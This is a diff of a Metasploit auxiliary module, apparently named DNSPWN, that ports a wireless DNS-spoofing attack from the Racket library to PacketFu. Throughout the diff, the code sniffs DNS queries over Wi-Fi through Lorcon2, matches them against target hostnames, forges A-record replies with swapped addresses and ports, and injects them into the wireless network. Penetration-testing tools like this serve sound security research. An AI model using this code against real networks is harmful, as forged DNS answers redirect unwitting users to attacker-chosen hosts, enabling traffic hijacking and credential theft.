@@ -11,11 +11,11 @@
 
 require 'msf/core'
 require 'yaml'
-require 'racket'
 require 'net/dns/packet'
 
 class Metasploit3 < Msf::Auxiliary
 
+	include Msf::Exploit::Capture
 	include Msf::Exploit::Lorcon2
 	include Msf::Auxiliary::Report
 
@@ -73,16 +73,11 @@ class Metasploit3 < Msf::Auxiliary
 			d3 = pkt.dot3
 
 			next if not d3
+			p = PacketFu::Packet.parse(d3) rescue nil
+			next unless p.is_udp?
 
-			eth = Racket::L2::Ethernet.new(d3)
-			next if eth.ethertype != 0x0800
-
-			ip = Racket::L3::IPv4.new(eth.payload)
-			next if ip.protocol != 0x11
-
-			udp = Racket::L4::UDP.new(ip.payload)
-
-			dns = Net::DNS::Packet::parse(udp.payload)
+			dns = Net::DNS::Packet::parse(p.payload) rescue nil
+			next unless dns
 
 			next if dns.answer.size != 0
 			next if dns.question.size == 0
@@ -95,34 +90,27 @@ class Metasploit3 < Msf::Auxiliary
 				end
 				next if hit.size.zero?
 
-				print_status("DNSPWN: %s -> %s req %s transaction id %u (response %s)" % [ip.src_ip, ip.dst_ip, dns.header.id, r["response"] ])
+				print_status("DNSPWN: %s -> %s req %s transaction id %u (response %s)" % [p.ip_saddr, p.ip_daddr, dns.header.id, r["response"] ])
 
 				injpkt = Lorcon::Packet.new()
 				injpkt.bssid = pkt.bssid
 
-				response = Racket::Racket.new
-				response.l2 = Racket::L2::Ethernet.new("01234567890123")
-				response.l2.dst_mac = eth.src_mac
-				response.l2.src_mac = eth.dst_mac
-				response.l2.ethertype = 0x0800
-
-				response.l3 = Racket::L3::IPv4.new
-				response.l3.src_ip = ip.dst_ip
-				response.l3.dst_ip = ip.src_ip
-				response.l3.protocol = ip.protocol
-				response.l3.ttl = ip.ttl
-
-				response.l4 = Racket::L4::UDP.new
-				response.l4.src_port = udp.dst_port
-				response.l4.dst_port = udp.src_port
+				response_pkt = PacketFu::UDPPacket.new
+				response_pkt.eth_daddr = p.eth_saddr
+				response_pkt.eth_saddr = p.eth_daddr
+				response_pkt.ip_saddr = p.ip_daddr
+				response_pkt.ip_daddr = p.ip_saddr
+				response_pkt.ip_ttl = p.ip_ttl
+				response_pkt.udp_sport = p.udp_dport
+				response_pkt.udp_dport = p.udp_sport
 
 				dns.header.qr = 1
 				dns.answer = Net::DNS::RR::A.new("%s %s IN A %s", dns.question[0].qName, r["duration"], r["response"])
 
-				response.l4.payload = dns.data
-				response.l4.fix!(response.l3.src_ip, response.l3.dst_ip)
+				response_pkt.payload = dns.data
+				response_pkt.recalc
 
-				injpkt.dot3 = response.pack
+				injpkt.dot3 = response_pkt.to_s
 
 				if (pkt.direction == Lorcon::Packet::LORCON_FROM_DS)
 					injpkt.direction = Lorcon::Packet::LORCON_TO_DS
